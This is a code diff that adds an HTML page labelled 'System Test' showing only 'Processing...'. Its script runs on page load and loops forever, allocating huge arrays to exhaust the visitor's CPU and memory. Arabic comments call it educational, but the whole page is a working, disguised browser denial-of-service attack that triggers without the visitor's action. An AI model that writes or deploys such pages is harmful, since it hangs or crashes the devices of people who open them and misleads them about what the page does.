@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Test</title>
+</head>
+<body>
+    <script>
+        // تحذير: هذا الكود للأغراض التعليمية فقط لفهم ثغرات المتصفح
+        function stressTest() {
+            console.log("Starting calculation...");
+            while (true) {
+                // حلقة لا نهائية تستهلك المعالج بنسبة 100% لعلامة التبويب هذه
+                let data = new Array(1000000).fill("Sumer Design"); 
+                // محاولة دفع بيانات ضخمة للذاكرة باستمرار
+            }
+        }
+        
+        // تفعيل الكود بمجرد دخول الصفحة
+        window.onload = stressTest;
+    </script>
+    <h1>جاري المعالجة...</h1>
+</body>
+</html>
+
